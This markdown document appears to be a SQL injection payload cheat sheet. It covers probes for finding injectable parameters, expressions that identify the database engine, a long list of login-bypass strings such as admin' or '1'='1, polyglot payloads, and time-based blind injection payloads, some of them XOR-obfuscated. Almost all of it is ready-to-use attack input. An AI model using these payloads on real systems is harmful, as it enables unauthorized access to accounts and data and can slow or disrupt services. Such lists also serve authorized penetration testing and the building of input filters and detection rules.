# Entry point detection
- [ ] Simple characters
```
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos; # required for XML content
```
- [ ] Multiple encoding
```js
%%2727
%25%27
```
- [ ] Merging characters
```
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
```
- [ ] Logic Testing
```
age.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
- [ ] weired chars (unicode)
```
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```
# DBMS Identification

| Expression | DB |
|---|---|
| `conv('a',16,2)=conv('a',16,2)` | MYSQL |
| `connection_id()=connection_id()` | MYSQL |
| `crc32('MySQL')=crc32('MySQL')` | MYSQL |
| `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` | MSSQL |
| `@@CONNECTIONS>0` | MSSQL |
| `@@CONNECTIONS=@@CONNECTIONS` | MSSQL |
| `@@CPU_BUSY=@@CPU_BUSY` | MSSQL |
| `USER_ID(1)=USER_ID(1)` | MSSQL |
| `ROWNUM=ROWNUM` | ORACLE |
| `RAWTOHEX('AB')=RAWTOHEX('AB')` | ORACLE |
| `LNNVL(0=123)` | ORACLE |
| `5::int=5` | POSTGRESQL |
| `5::integer=5` | POSTGRESQL |
| `pg_client_encoding()=pg_client_encoding()` | POSTGRESQL |
| `get_current_ts_config()=get_current_ts_config()` | POSTGRESQL |
| `quote_literal(42.5)=quote_literal(42.5)` | POSTGRESQL |
| `current_database()=current_database()` | POSTGRESQL |
| `sqlite_version()=sqlite_version()` | SQLITE |
| `last_insert_rowid()>1` | SQLITE |
| `last_insert_rowid()=last_insert_rowid()` | SQLITE |
| `val(cvar(1))=1` | MSACCESS |
| `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` | MSACCESS |
| `cdbl(1)=cdbl(1)` | MSACCESS |
| `1337=1337` | MSACCESS, SQLITE, POSTGRESQL, ORACLE, MSSQL, MYSQL |
| `'i'='i'` | MSACCESS, SQLITE, POSTGRESQL, ORACLE, MSSQL, MYSQL |
# Authentication bypass

```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

# Polyglots (multicontext)
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
/* MySQL only */
IF(SUBSTR(@@version,1,1)
<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)
<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1
)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```
# time based (coffinxp)
- [ ] generic
```
(sleep 10)--
(sleep 10)
(sleep(10))--
(sleep(10))
-sleep(10)
SLEEP(10)#
SLEEP(10)--
SLEEP(10)="
SLEEP(10)='
";sleep 10--
";sleep 10
";sleep(10)--
";sleep(10)
";SELECT SLEEP(10); #
1 SELECT SLEEP(10); #
+ SLEEP(10) + '
&&SLEEP(10)
&&SLEEP(10)--
&&SLEEP(10)#
;sleep 10--
;sleep 10
;sleep(10)--
;sleep(10)
;SELECT SLEEP(10); #
'&&SLEEP(10)&&'1
' SELECT SLEEP(10); #
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
ORDER BY SLEEP(10)
ORDER BY SLEEP(10)--
ORDER BY SLEEP(10)#
AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
OR (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
RANDOMBLOB(5000000000/2)
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000000/2))))
OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(5000000000/2))))
RANDOMBLOB(10000000000/2)
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))
OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000000/2))))
```
- [ ] XOR obfuscated
```
'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X
X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X
X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X
'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
(SELECT(0)FROM(SELECT(SLEEP(10)))a)
'XOR(if(now()=sysdate(),sleep(10),0))OR'
1 AND (SELECT(0)FROM(SELECT(SLEEP(10)))a)-- wXyW
(SELECT * FROM (SELECT(SLEEP(10)))a)
'%2b(select*from(select(sleep(10)))a)%2b'
CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(10))END
');(SELECT 4564 FROM PG_SLEEP(10))--
["')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23"]
DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar
AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar
1' AND (SELECT 6268 FROM (SELECT(SLEEP(10)))ghXo) AND 'IKlK'='IKlK
(select*from(select(sleep(10)))a)
'%2b(select*from(select(sleep(10)))a)%2b'
*'XOR(if(2=2,sleep(10),0))OR'
-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//
'+(select*from(select(if(1=1,sleep(10),false)))a)+'
2021 AND (SELECT 6868 FROM (SELECT(SLEEP(10)))IiOE)
BENCHMARK(10000000,MD5(CHAR(116)))
'%2bbenchmark(10000000,sha1(1))%2b'
'%20and%20(select%20%20from%20(select(if(substring(user(),1,1)='p',sleep(10),1)))a)--%20 - true
if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0))OR"/
if(now()=sysdate(),sleep(10),0)/'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"/
0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
0'XOR(if(now()=sysdate(),sleep(10*1),0))XOR'Z
if(now()=sysdate(),sleep(10),0)
'XOR(if(now()=sysdate(),sleep(10),0))XOR'
'XOR(if(now()=sysdate(),sleep(10*1),0))OR'
0'|(IF((now())LIKE(sysdate()),SLEEP(10),0))|'Z
(select(0)from(select(sleep(10)))v)
'%2b(select*from(select(sleep(10)))a)%2b'
(select*from(select(sleep(10)))a)
1'%2b(select*from(select(sleep(10)))a)%2b'
,(select * from (select(sleep(10)))a)
desc%2c(select*from(select(sleep(10)))a)
-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(10))A))
```

